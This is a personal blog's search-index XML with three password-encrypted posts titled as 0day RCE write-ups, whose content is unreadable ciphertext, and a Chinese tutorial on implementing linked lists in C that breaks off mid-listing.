<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>蓝盾防火墙前台RCE</title>
      <link href="/2023/03/17/%E8%93%9D%E7%9B%BE%E9%98%B2%E7%81%AB%E5%A2%99%E5%89%8D%E5%8F%B0RCE/"/>
      <url>/2023/03/17/%E8%93%9D%E7%9B%BE%E9%98%B2%E7%81%AB%E5%A2%99%E5%89%8D%E5%8F%B0RCE/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="165e46db308ac0d358cead50c01f179d22358b12e7bde77f795c3c20ee5ca8b9">a18c464404a1613be2d6ed29404d7b521f6591b47551084a6136760e5c2d65e9b622fdff4d2b74596876a83645c7702beb6ac223abd824692c4c0737254b8a28</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey，password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 0day </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CNVD-2022-43072</title>
      <link href="/2023/03/17/CNVD-2022-43072/"/>
      <url>/2023/03/17/CNVD-2022-43072/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="7e726d5428764d077c1032347f1960c8e0cd83bb940f2b4628ed17050144e38a">a18c464404a1613be2d6ed29404d7b5291cca9692417aef60dbd8812b05bab8d857af9de96916f07eba9116e70d607cdfbc9f9bdb057c9e33741b0afb5e269845be7bfe0d19aaed29362b2f0f636540f6c2b3d0bacb4a3bddbe181e8c0e60cbb7b18b1171b8664946fb9704eeddea5272b8fde03b23f859d34ac348ed09bea907f7285e48c938def829ce4ee79bf3cc10a0bf379c8656ab67b50eca90680f9c654a2103a536f4e8b23e5455c72c62eadbd86bbadf7c667da26ff34cc59bb835c5c95c8fb6ac5d8df2ae8236a94da06630319a237b05f9067e08af268967bc28f7d1128d6d912dcc60392f57327b56c2f6e71d979688ff4a8cfe35b845693c52810339a94283fced13b3ea1deac8a449115fed6803f9411f1bf4d6817acb1d6ee503fff58382f077cb9a7f93d7173c80c12637c7fa9b3612b6e1e92ce7ded17e56fd560f22324187bb52a9a1d87e8a3acd3e9b257430a20d83c170b4d36ab696a216c723496ced883cd9be2d1af0ec13e924f92046a472fa42d86f8510cee329eeff653dc65627b8d538620891f994f87972def2ec8e2ce1e884e04ebb103ca4890a6b671147d600195b584e56c3a8363ddb4fcf7674b684dd56ba97464d5ef159a1c79b86d8a18327a0479aa55a4a231d284d2f83e0095e48179aa03633cefea49e3153ed1af268f7287be6ec7d2c18cccc660f1521ec9093a7cd37b1f1eb5bd2edacdc96e3802cdb840d3ee26fbb051097e36cb0653db985058ac2d5df0f26b2b06e517003e8a0137961f2290f592164bbd39b4c0cf4e7d7b7bbf40a5010fbe938f3792e6366bf1085a3c2bec370b482885dc05fe4232a05edb430fb57028a8dbcf80667678c3146e8f6e28d272d2c29a02e1032dace2217802d83cbea262042a98a63a7c6528b285c321cdefe604339e521be16744eb97235ecacd35fa93c193431cbb6aed7637d3b901d7a31a9156b1ff4a86549bb0b915a0f9731fc650902169f45b2398265e582d12138d3992a8690b73301df5b363905f606f18e8241e58c9a216ec52d684403b084527ee7055c05d604db28594409abeee4e78a3e6c53de10951041f2a19f86127a461ddefa87c815e9715dac76981e1c539e4947d7c16733089cb75056111594947ace555dafd958cfee99d50466101b6dda84f0daad6859eae96e3e0d00d7d0147bb3ff4934c7f8bfa5b0caec5984f2af144997180ccbfa141d6304a33fad7ab455502dab76978fc3d7c069ae69bf40358e5fe838d8f292c973ec6c2a3c83a34235c920741f6ad5b8421f01afc393ff09275d2b0e809eacc3db1426998f3db895054d2b3c4e221279d3d86fa9ffd925fdc39d050c36cebdaa336d673057e678ae9470ed87f056df28f18134919aa2f79d9ce100cbe1795d596deca9253582d57feb501766af3a9c4ab11a1e4bb1c6ea6aa4b62a370694a9e2656a461533d01f1509bf2c88979a7f98c4f1e0072c263ae84bd315efd540eb99a16f5ed2a83c6e8ac3a24817c43a4ca7d8e0660bcfea5c5208ab5f3ac65aa442f1a90ef403e756e51eb303b8c505da013692ee813934397b34ad3b3d69ef2f799d418a5fca9c06a15c9252de988abbbf0cbc24b14037f573062d5ca2fdcb48796c9d91b8663fd1b0a75cf555f7df61d5339138a70ddf6749438badf944c9e6d773a9267eddadb40ad2c7bdd29370519ec570efeb7ca898752b9f073e8e0a67bc2a938126d3e14e972181716082704d06e9cb14109f894ac90f5c4448a9c835fc75fa8cfab3f2f24b8af8bdab180ee3d3ac21a0d6942934bad8c777ae603349d35cb8a9d33374bc1c2a4ca52018b8ced4a8b42f2b354c6002ddaf0292ac04ad05ae84aa236f2f4026a474740cd8389950ab5edc4a179de7c486a72c39ff221bf5e48565b5aef4e0a126f5d6c685c2101c04cd627b38261019854de07dbda280aefd9ac7fa9004eb467106e96fecab3fe97d810223ec7c6599785a0078afce82a52aeb77aa51c9b680cdc4acfe5e9a84d20eb20bfa13d2e61d82e794f42039a5fd62ae5f5055f33f710d5b97af197a71ca13e75bab611a6f1249971cf92b88818edfee7457fc37afce7c1870d11f4a9f92dba914d43d0f12d762e14927dcfb6175b3b8a62b28609ed8a0348132d1c4719e7636996e9e8714f0ebddc5e8f2f9e1d16f1ca5b56b1df86bae11e49c64d5d0da040c2cf57f40eae3d6dd7b02d529029c369653e16ad695f34ce17d148e88e43cb8cd5a28a5637e8a6cb8b2646bcf729c6f1f5433971bd0a54177ea43295ac83a67ff195dc2b72c461a8c65a7f0635209f002820a22fd36d8e73d8acf02c06ae6b9ccd4ee0acd644df7ed9e43d995920b9add2ca5bfa065096de10b5000399552d1138f1aa7360a865add5e3a5503b21f92a3788ae22cae597e6ec788d945b6383045a666cdcc5e501705de17d5ad616a74fb3e714c47dcdd9579681b46e9b1b8a1c82620ffe573a54d638773aed21921ea481905b9ef2c9b9d957d3cd0234e845c5ccb1413b5741d8f9413d89b7d7a000ece82ae6ffa6cda2652671a894135bfc26e578edcb15b4c2cb0d1ac38c87bfa4bdeeebec2e02c15b772bff240f63b0c8d2870b099c9250c503a2d80582db35ac0329940c0352d6ca2d61f363fb9b8b46888a6b98a27b1e7d97406097d571bf0e180e669a8b39c04ae3e7bac31f0f87da74c430be2aaad2e8276a38746c939575c7413949dcf5ac9de95357bf29d179c84e8d180ab126ffd77d6474d1a2dd83025ea2cc832f3a9cb37768c8f21df66848376f4a349342cbb7cf4bfdc587294f97aeaf3cdea395c65575c850e11a0272c137218ce25433d8a074c2e9072d1a2dfff592ea0a611804d98b153b49f42b2b4c822600660328632a4d0737c3588358aaac810b628ed8c24e199a3c9e4ccbd90ab9ef77554b184920fc59398b428dcdc390f66fc9e2e02d9b537ad1e21e6609bfbe731522239959e05831e1aad309b91c4f7105a83ebbd21f138625767c647329ca67314955d502797d0f8d8d7434087a56a62a95370b7ab8f5bb0381469d0ba5276d92ed6784ffbb7f08a4630c71f9753bb712266ea55da26b8200dd7355265058594f28270e119acd1d93b110c6e337d1883999a25256a4eec4b60b389a77a5907df6881f866dc0c8f629cc73a694c78eefe84eafdaba8222a885604236d7d8b49cebdd3d4fcde5589d2419db5c8d0bbd7be8759cf69e76c92e63414cdce4c2d1a443205a0765d33a6664e750adac6e8a04f469fb9fc4acf41974a731e1546dbb4025bb6dd741224900681e531314abc090dbf88d6f9d920ede88096eb588a98b0c19f7b2af9094b7794351020f9d0ef551445caa830db5ff71b0e9230a512687252e967ec90ade9683eff7e36fe11a64032d0504ca10e4156daf7042cf54f046529d2f3d5d29558394bfcfbf334478d395634a72854886146ee94da140f333af47caba3eec0aea5b403bc59b4f65cce99b6c6dd6814fa0c52a21e8f2a92feb0fbed6f53336e8ad68c10475b37b46094daa9f4e0b9a9771d38d0cb0bdb4c50cf6a2dc888f4a28132941bf3c29a96157cf90c9ef6b42297bba53fd235852bfe04cb777383a017effc5268dc47ffdd0135baf1e3b46f295cb7352621fbebe074540dfb1bb667ff156ed49ded7708818360ec272dc7eaadf094a582b06d56e550fb29d1f572f8789c1fc61f26f96a8d741af312efdc7f8f5d12b611d841b28a847d4b551779f991035fd029f97d259755ad84df570e3ae234cb6a5ef92531dcfdadcd50b140008f15de42c787d54261fc8bc682be058263ca180eb91be0d13b8e30ddb3c5b79b0b2de79e6672dc2a63edcad2d1a3f148b72f0035c62e82fd0495b56621a6f3b633e66eb40231203093a437fd2e223e7ddb714cf58862e1d2d956f4b28ddadea2b8efbdce4369cc52608058331ca776c894b989af24c561ab90772d826601dbd75661dff9a6f26316a8ff0b45626ab5201aa27d4ecd2d2936e5158309a52c5365812af0c4d50267986ea70f763cc435174cea3d60fe1c7097b89f95e48f9047952c990e5eccc8840723c63b0f2aea777f26b9d6114d46c8f514d2444139ec82990066151631d9536496479afe9fe2a3c96dab9f936ff5a800e78b4b0bb79fe8f60d20a228b5397a64d17e5427b8d195ce4e621c47d88a8f8ce0f198ed1718c6ec7e9a5f04c45f578f01b750cd14aaa04c9fac81e254b1202e94a1f68bb793c1f64f354349bd3fc</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey，password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 0day </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>0day-dompdf RCE</title>
      <link href="/2023/03/17/0day-dompdf%20RCE/"/>
      <url>/2023/03/17/0day-dompdf%20RCE/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="9848363fe0ecf2b3e1235576ab8f60206b58a6ffde0dfc19f5c6120c6d089ab5">a18c464404a1613be2d6ed29404d7b523f179d2aa26bedf7b564e8e6f204736242ea2118f70d142bf6ffeffec7a28b77436d669c07a083bdc0352fb22db83b907210df11604fa42ee5640c69d268e5166f36cc4c8a5a2ee301d747f75ce438294db74c732b1f5cfe31ff88bde277cd42a85973e8ea2d32ae82157c2060a578429d71fa655e531a97b8b5b90882d402f02b65d98d4614d7331e81f6dd2b5774712b178d9a83b7be53ed162cd5c8588531089b9d479dfe6096c5c26a3f8711619b8137070b99ea64cdb2c07f07efe136ac054e73c42042c2e579bc05ff4336eb9f654794a12fdd2004b4c2ab6d0033222bd3e1a25490d3903efda6d7cb3764d21ca705151ed54fb16981860a9189cc86ff1c1cffcd7f0a128e6689cf49a2b37dbe4692ecc482de72e48b4349f56bc493ce8735b56f53aa9725a439b2de7d798904d83e98f6bf302ff941ed83759c76e271aa899590473da85d1911b7badaf96f8db432ab5ed415039dd277c376f24aaa31838f2866125fd7101d4d47e45f60e53de0fdaaea2a5ea57be3c8d4574d8748cf3ce98691e1a1ffe40ae30b1b96ea18bcd0e86a9fa1aee1fa54e54607287cc4f113870c6436184c0eeada5845262bc6577a80dc4174783a2c140692968e3b09a154b7b021dce9a73e6590914a6e689d90617f48e812d50cac0a8244f2cc227dd9e15958ec3047e5b0c0ca2cc48805e1530789cb8c7b337ba2aa31234f607cabb00238a25478dd0ce3b08963465e88e0bc9b485a9c8412f65ead3a0a0b4be84557fb4310ae0c39328a11d96f658aa4630fd63770bc06ff4cc5193f486e5780e20abb4cb41e5f8b5c39e13971a9ecc576a23a08953213329e464dee0dbbe3f8d55fcb88e19b822361b15df43c2e66154f6401f87afea870037e363bd5e8ef7a52087566689ebfb3b7732d727518684f23ee333edc4191654b65c16a4add42cc2350d3582a60a3bdb54fc80d16fbafb27f749797eb20f00974f0647744f961e7fb139d59e615edde6592cb1b6a0c5cd6deaefc4d349d0a87037509bb541f914556782079dcca6c2f026026487c611777af5cc4804305548aea4b065371f01d20a6b37da26e95246aca2394fd97827d9eb5f27c396434f292eb0903eff535b549eb488c7fb91cc9ded9d6b33de2c616c7e04a124f6a56ab4d977babfba012d75c2f9c8e1a057ff939e37471856db71e5b966d710d89b71490ab1c9cf5fa7fba8c50deafd9488df62976f9812bcc439e6cabe38fcca9bde00ccf8312f4331e74079b72ffcc7c7e145c5fb34863ab68f2264073ab87d0fa4c1b71e93a7df57a4916569e34c583310d1251a526dbd4efada5a70030e80927ebac2c42daf5b7ba93456098c4dd075b91ff8e4abf14bcb4c88a93d6b617d2f7216b1f75043a0f3441a34be69148be8b8e8eb035e5caf4901766cebe5f397de01cdffec4931d954607649be26e840b8ffb1ff53c0bba90a084094fcad7b340f7e6538b2c20864dd5b83fc954ad3faf94726fc80c65e72d2741b42916059b632f909d6cde95125a0586e759a08c547ab8fc0af40f67879da683b78995055e8f81b7b2ba8d5565fe297ed130178745c47c0d75a6c409cc76f556aeb9b4fc3de475b2ec8ba7a62c29d923a9fcc90e582363cf141f32879514a5adb13ddd65b25a0b35f06c180b3055091da452b29a4f578448ff363b7c80b555bd1c0347e85bb1828b8ed7c43240c97d348352f50505503ef23b204a834ab44b23302510f439fe433c9c04e8d822d9a74a9563a2414562a0f3441c69f9f7f477b788e536ae33b40fed29ad02bd7a44f7169b0afab840135b1a567b79fda5542e54cee84c13436f4a6ea1977540dcd154dd75cff330bf170d0ad36370f81effbb09aa1c29190ffadaedfe70018e9767193751ee723c2e3573106e9da8d417716f6419e7bd3e759b00207801a6c213f5d9bed81fe3bca6438b0e8ec09cc0af38679fed31d96aa26368b8142827f44422fa3cb3a97b23e076e1bf527b196b1d366d3f78f79e1d9d0390fe0c48150f13b79355a3741c050f8875fe60d1aee1d258b138a15627a4fad0725dc4630b9a2f1c82fede2691c0ba1b91b119d0731ebcc5a1ecea449afe973d849bbc437d69c63ff184ed85d31c4fcacf5d4796fe7021aabe551eb39c61f67e9623ee4f321aea4d02482d74d52a6c6b249abbb4603cb9a6022573bfe4d43602fb9af15bbe51abc79e23305eeb97bb2e991953f76db00dca1d11bd0cf3d7c318a48092fc6cf832f578f1eb8d0889b77bcbca8caac535f34f78e5e900b3655d13837b53d417f11291f5d1a553c747b5541ce862908d5df12cb6649a7fe4acfe4ef00e1ad8040c02f7d17c6d68c2710af8bd039c44298a5120179fb4c64e6fff6789d35a9ba2cf0681b16316ecaffa44519131fcfefca674d2c15335af5e8b316ee8edf216d2d15837eb43842d57eb960c9a9754ab3f2693b8d904f0d0cbea5e4ca7ca26a6a09cc41c11fd1253e72574824e3d94324fa0ab86f5af75fce06152b35b865277c634936c6df4b29c100f3b8b7749d95e9ff79b4c24c104f101d9efd4454217deffe22a33d53afbacb71192d3fca7f6d22e46808a26d1df64de30f2d81bc7173afc1c2f1a36e8226912a01e5aae9c98ee23bc63d54b5e29911889122508d32703c6964fe257030a31e8d1943f2eeae1f02ecefa3ac7bc854ecae5a1753b8b3e718f4fcd805ddc711fffb3a5b5da26518761a32fc728cf41113f4e9c18ef74e0cb0260966580c00f30974d9e195a9160b8c25a500aaf8f5d5bee5466d6478706e415d91799b82cc29cb53c9e6cdbe6a1738925cab7d3f1f008e15ab0f26d8fbebf850c0d05ed5ef0234e841e0faa5f56c9a9afac33470563a4a5ba9a471e82c2cb43da6a9b66bcdb869afda7222acffed43323fd4b13c6915f3bdd9663da9a1578719fbaf18fe1c612ff19fe8fe70cdc76edcb92c0f1382e5d4c0043f38eeea9c769b5e1ed648d1401638647ccacc98a4bd1feee95cc704c98d92b15592fce4c97876bab671effa8a3ac1ae7092adc2140a4c954d9ec50b7787ae87ae74bed8a5b7334925d723d4472eea44a085d44ae8f1667cedddf4f17a90cdd3620de4c4491975992d0c2d840ac45ca572a27d5bbccfee065170e667ed876788b52e7f9fea16c5f6b48d3f3fdecf42d73a2d770c67116e529d79993ea551efd8e64811b6f366aaf4a7f5a7209a80a4ff8c4e53824bfe2f05dcc3425eb7261de3f42abdca8689baf6878b5e094ec669d598de30bf1ef32aa0b2061a26629da31d9f54b64398f770d337f8c5bac3ab80bcc7403cb52d644ca78604f811a0effc100873f63fc241e7c46775e15f3258d79fee7788e61610f98697ec2c7af520c964b7c6c7989df4196a0c110e976c76ccd511cc266bfa09cece8a78ee1c1a6c253f15e9ae2191c0a99a1156114115717890ee248dc1b2d4528f4a265d4aa38979c8c9c384f2037fb067c62c449cd0a8be7468c886e5da7c8f88fe0942eef797038323d1c0919c13527f253ca898a5c27f355bee633c4c46fe4ebffb72ccd5e44f22ea4aefdabf3139f9f12497964be2fe617930a50fcbb6afeb4bb8e9934d71670eac66f2bf5e74f15e752338e07d74b094ce2c0ee6e6bc82b9a8d19f14b9ce4860faa03a87cca6a6a694aa7fac60b5f1fe08f6bad467c14bd4d4abf3d484204f3fa3177c95bcb697ffb2f85d11cc109e6bf1273275b91d08001fbd07c1bdf93eda8eb6acaa2043ba6cfe6f4335b01f9bf1b750877e8e61917a27da61449da18e2c5059d6417ca392e4db28cc8210cbeddcde0fdf37ec31925b963af4532db58b677cc09bcf878da326e9eca9205e1a1a6165f92ff268ba82334b75e7345ad1e3f14e388e21e1643fc835756d6d8848cadcdd11002dedc6c95d9003ebec2b30a4e26eaa93f723da74c6ceea6e649e1806eb55cd47e6c1c862eb41237c3cb443c982903b8d78ba6b327aceb62c1481b972242055d280307083eeb8d5f6258379064869878ccb18e92ae600465362a00e075b3243c60d40cac07201d7eb99fb269e12184b832e30fef504ac286b11678622e0395ee67b34c557183a6bdf87a22d4f240812826dcbe4d6a5d03f9c39429501605a3ac437ca4e352adca91a63c01abf7bc9b931dbd2015828e4ab98020dc38c87d90b691bcf57072eba84458d321297702135a665f9c1fd1c9db9017d642a9b934d7bf2400ea1f14e973adb96b7f630a7a5083914391b4a6d6f9cbde4a76a316e7ed6220d15c8da655f6d3c54edf5787c597a3364c6b5b65aca76807b6c8523227b5bf7081ec62817ab37d5dfab9a4484fe5d2b7aa0e6424121dd98b14240e1698c5ba7fa89b3c0ec37ba41301759eaaf5da8ecde0bc95c5787e2f0629654d9a6c13992ff5098312cd710d8123d00424b62cc016be9c32db70f2124dbdccd76fec5b34ef419d02a215ef5f2c89d59134d141c5c028b081bf0464353ddce5c62153c7b755110f23bf8ddf70b74966aa24f771f43bee97168e15165abb3133cf405091dc55f6c25f7f9a2e420017b41a344de1c887cc095cb2bd907e3835fa3c45aef6828fc5e1697f2a2a7f9c0bf466420bf2a7f04e4bfdbbcbd5e98831c41420a35ec924f8bf5d8e01d3992f669f4a1ac669b6b8198072d0130e387b4406d7f6cde15dc60fc245ad8e841ef6b5cd239c9ddbdad3a1ae68f9c7f51bdf2e32ba3cb64533d3a74088e54dcdeb8cb7c1b5ef2a0d1892dc543bddbff93be092c23a2ee08203201e99eb2a7688518dd9505fec0fc224d797fe4daa9212fc64fdd9cd0a5d85c6ec573f02c1b19ee997271f55a6e12e793027b8e965ce0ca3b540c4a0e664bb81fb50e494635a20057f092fe249f67760abb327fcb9b2dc66687d255db402b5693660fe563245deb88dd5747b525a242d0637682f1ce1fc90ebb55aff2e7217c372c22618eb9354d785b81f1188e79d8db47dcd3faf22d3e403e7163323d26670096c52fc0f08562ce9301ac8852731941a2339f43c59ffa8bcd0f27df0e142a92ebac070a03959e494b4ef07f8bdabef13ec6c4641c4ff252bd2096b3fc7f659e389d189ae25445b496b7e8c9e07ee30851f50aba34574fc8e1461ccc5b41b87095a4d770d9bb3cc55b70eebdaa62e59ee8a89e8598d9da04fd268a315b742926443944de248bda99c5bb9530727ea038d9b987d7421e0d1e000739dd7444b0a6a643e6aa0379ef271e9a9be8ddbb7d87f18479cd6502452b2690c07f53eec4728bde059c545738374e399f81ebb37b9f6d95564107df120165bb7a5be3abad7fb99a830c4b4108884cc0ce5</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey，password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 0day </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>数据结构-链表</title>
      <link href="/2023/03/14/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E9%93%BE%E8%A1%A8/"/>
      <url>/2023/03/14/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E9%93%BE%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="链表基础知识"><a href="#链表基础知识" class="headerlink" title="链表基础知识"></a>链表基础知识</h2><p>在 C 语言中，链表可以用结构体来实现，结构体包含一个数据成员和一个指向下一个结构体的指针成员。下面是一个简单的链表结构体示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> data;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>现在，我们可以使用该结构体来定义一个链表，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">head</span> =</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><p>这意味着链表是空的。现在，让我们来实现链表的插入和删除操作。</p><p>链表插入操作可以分为两个步骤：</p><ol><li>创建一个新的节点并将数据放入其中。</li><li>将新节点插入到链表中。</li></ol><p>下面是一个简单的链表插入函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">insertNode</span><span class="params">(<span class="type">int</span> data)</span> &#123;</span><br><span class="line">  <span class="comment">// 创建一个新的节点</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">newNode</span> =</span> (<span class="keyword">struct</span> Node*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">  newNode-&gt;data = data;</span><br><span class="line">  newNode-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果链表为空，则将新节点作为头节点</span></span><br><span class="line">  <span class="keyword">if</span> (head == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    head = newNode;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 否则，在链表末尾添加新节点</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">lastNode</span> =</span> head;</span><br><span class="line">  <span class="keyword">while</span> (lastNode-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    lastNode = lastNode-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  lastNode-&gt;next = newNode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数将数据作为参数，并根据情况创建一个新的节点并将其添加到链表的末尾。</p><p>链表删除操作可以分为三个步骤：</p><ol><li>查找要删除的节点。</li><li>将上一个节点的指针指向下一个节点。</li><li>释放要删除的节点的内存。</li></ol><p>下面是一个简单的链表删除函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">deleteNode</span><span class="params">(<span class="type">int</span> data)</span> &#123;</span><br><span class="line">  <span class="comment">// 如果链表为空，则直接返回</span></span><br><span class="line">  <span class="keyword">if</span> (head == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果头节点是要删除的节点，则将头节点指向下一个节点</span></span><br><span class="line">  <span class="keyword">if</span> (head-&gt;data == data) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">temp</span> =</span> head;</span><br><span class="line">    head = head-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(temp);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 否则，查找要删除的节点</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">prevNode</span> =</span> head;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">currNode</span> =</span> head-&gt;next;</span><br><span class="line">  <span class="keyword">while</span> (currNode != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (currNode-&gt;data == data) &#123;</span><br><span class="line">      prevNode-&gt;next = currNode-&gt;next;</span><br><span class="line">      <span class="built_in">free</span>(currNode);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    prevNode = currNode;</span><br><span class="line">    currNode = currNode-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数将要删除的数据作为参数，并根据情况删除节点。</p><p>现在，我们已经实现了链表的插入和删除操作。您可以在您的代码中使用这些函数来操作链表。</p><p>具体实现代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义链表结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">    <span 